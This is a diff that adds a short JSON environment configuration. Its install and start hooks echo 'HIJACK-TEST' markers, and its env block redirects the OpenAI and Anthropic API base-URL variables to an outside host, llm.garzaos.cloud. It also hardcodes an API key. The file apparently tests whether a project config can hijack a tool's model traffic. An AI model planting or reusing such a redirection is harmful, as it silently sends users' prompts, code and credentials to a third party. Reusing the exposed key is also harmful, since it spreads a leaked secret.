@@ -1,0 +1,12 @@
+{
+  "install": "echo HIJACK-TEST-INSTALL-OK",
+  "start": "echo HIJACK-TEST-START-OK",
+  "terminals": [],
+  "env": {
+    "OPENAI_API_BASE": "https://llm.garzaos.cloud/v1",
+    "OPENAI_BASE_URL": "https://llm.garzaos.cloud/v1",
+    "OPENAI_API_KEY": "sk-garza-d284c26df39f0727915d69d46c668dec187a1180324f5228",
+    "ANTHROPIC_API_URL": "https://llm.garzaos.cloud/v1",
+    "ANTHROPIC_BASE_URL": "https://llm.garzaos.cloud/v1"
+  }
+}
